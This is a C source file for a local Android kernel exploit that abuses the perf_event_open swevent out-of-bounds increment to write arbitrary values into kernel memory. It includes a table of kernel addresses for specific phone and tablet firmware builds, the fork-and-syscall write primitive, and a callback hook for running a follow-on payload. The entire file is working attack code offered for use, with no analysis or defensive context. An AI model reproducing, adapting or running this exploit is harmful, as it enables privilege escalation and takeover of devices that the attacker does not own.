#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <errno.h>
#include <sys/system_properties.h>
#include <signal.h>
#include <sys/wait.h>

#include "device_database/device_database.h"
#include "perf_swevent.h"

#define PERF_SWEVENT_MAX_FILE 980

#ifndef __NR_perf_event_open
#define __NR_perf_event_open   (__NR_SYSCALL_BASE+364)
#endif

typedef struct _supported_device {
  device_id_t device_id;
  unsigned long int perf_swevent_enabled_address;
} supported_device;

static supported_device supported_devices[] = {
  { DEVICE_F10D_V21R48A,            0xc09882f4 },
  { DEVICE_F11D_V24R40A,            0xc104cf1c },
  { DEVICE_HTL21_JRO03C,            0xc0d07a7c },
  { DEVICE_IS17SH_01_00_04,         0xc0ecbebc },
  { DEVICE_ISW12K_010_0_3000,       0xc0db6244 },
  { DEVICE_ISW13F_V69R51I,          0xc09de374 },
  { DEVICE_L01D_V20d,               0xc1140768 },
  { DEVICE_L02E_V10c,               0xc0c61038 },
  { DEVICE_L02E_V10e,               0xc0c61038 },
  { DEVICE_L06D_V10k,               0xc12f00e8 },
  { DEVICE_LT29i_9_1_B_0_411,       0xc0cecd74 },
  { DEVICE_SC04E_OMUAMDI,           0xc11489d4 },
  { DEVICE_SH04E_01_00_02,          0xc0ed41ec },
  { DEVICE_SH04E_01_00_03,          0xc0ed41ec },
  { DEVICE_SOL21_9_1_D_0_395,       0xc0cedfb4 },
  { DEVICE_SONYTABLET_S_RELEASE5A,  0xc06db714 },
  { DEVICE_SONYTABLET_P_RELEASE5A,  0xc06dd794 },
};

static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);

static unsigned long int
get_perf_swevent_enabled_address(void)
{
  device_id_t device_id = detect_device();
  int i;

  for (i = 0; i < n_supported_devices; i++) {
    if (supported_devices[i].device_id == device_id) {
      return supported_devices[i].perf_swevent_enabled_address;
    }
  }

  print_reason_device_not_supported();
  return 0;
}

static bool
syscall_perf_event_open(uint32_t offset)
{
  uint64_t buf[10] = { 0x4800000001, offset, 0, 0, 0, 0x300 };
  int fd;

  fd = syscall(__NR_perf_event_open, buf, 0, -1, -1, 0);
  if (fd < 0) {
    fprintf(stderr, "Error %s\n", strerror(errno));
  }

  return (fd > 0);
}

static pid_t *child_process;
static int current_process_number;

enum {
  READ_END,
  WRITE_END,
};

static pid_t
prepare_pipes(int *read_fd)
{
  pid_t pid;
  int stdout_pipe[2];

  if (pipe(stdout_pipe) < 0) {
    return -1;
  }

  pid = fork();
  if (pid == -1) {
    return -1;
  } else if (pid == 0) {
    close(stdout_pipe[READ_END]);

    dup2(stdout_pipe[WRITE_END], STDOUT_FILENO);

    if (stdout_pipe[WRITE_END] >= 3) {
      close(stdout_pipe[WRITE_END]);
    }
  } else {
    close(stdout_pipe[WRITE_END]);
    *read_fd = stdout_pipe[READ_END];
  }

  return pid;
}

static pid_t
increment_address_value_in_child_process(unsigned long int address, int count, int *child_fd)
{
  unsigned long int perf_swevent_enabled;
  int offset;
  int i = 0;
  pid_t pid;

  perf_swevent_enabled = get_perf_swevent_enabled_address();
  if (!perf_swevent_enabled) {
    return -1;
  }

  offset = (int)(address - perf_swevent_enabled) / 4;
  offset |= 0x80000000;

  pid = prepare_pipes(child_fd);
  if (pid == 0) {
    for (i = 0; i < count; i++) {
      syscall_perf_event_open(offset);
    }
    printf("Done\n");
  }
  return pid;
}

#define MIN(x,y) (((x)<(y))?(x):(y))
#define BUFFER_SIZE 5
int
perf_swevent_write_value_at_address(unsigned long int address, int value)
{
  int number_of_children;

  printf("writing address is %x\n", value);

  current_process_number = 0;
  number_of_children = value / PERF_SWEVENT_MAX_FILE + 1;
  child_process = (pid_t*)malloc(number_of_children * sizeof(pid_t));

  while (value > 0) {
    char buffer[BUFFER_SIZE];
    int child_fd;
    int min = MIN(value, PERF_SWEVENT_MAX_FILE);
    pid_t pid = increment_address_value_in_child_process(address, min, &child_fd);
    if (pid <= 0) {
      return (int)pid;
    }
    read(child_fd, buffer, sizeof(buffer));
    close(child_fd);
    child_process[current_process_number] = pid;
    current_process_number++;
    value -= PERF_SWEVENT_MAX_FILE;
  }

  return current_process_number;
}

void
perf_swevent_reap_child_process(int number)
{
  int i;

  for (i = 0; i < number; i++) {
    kill(child_process[i], SIGKILL);
  }

  sleep(1);

  for (i = 0; i < number; i++) {
    int status;
    waitpid(child_process[i], &status, WNOHANG);
  }

  free(child_process);
}

bool
perf_swevent_run_exploit(unsigned long int address, int value,
                         bool(*exploit_callback)(void* user_data), void *user_data)
{
  int number_of_children;
  bool success;

  number_of_children = perf_swevent_write_value_at_address(address, value);
  if (number_of_children < 0) {
    return false;
  }

  if (number_of_children == 0) {
    while (true) {
      sleep(1);
    }
  }

  success = exploit_callback(user_data);

  perf_swevent_reap_child_process(number_of_children);

  return success;
}

/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
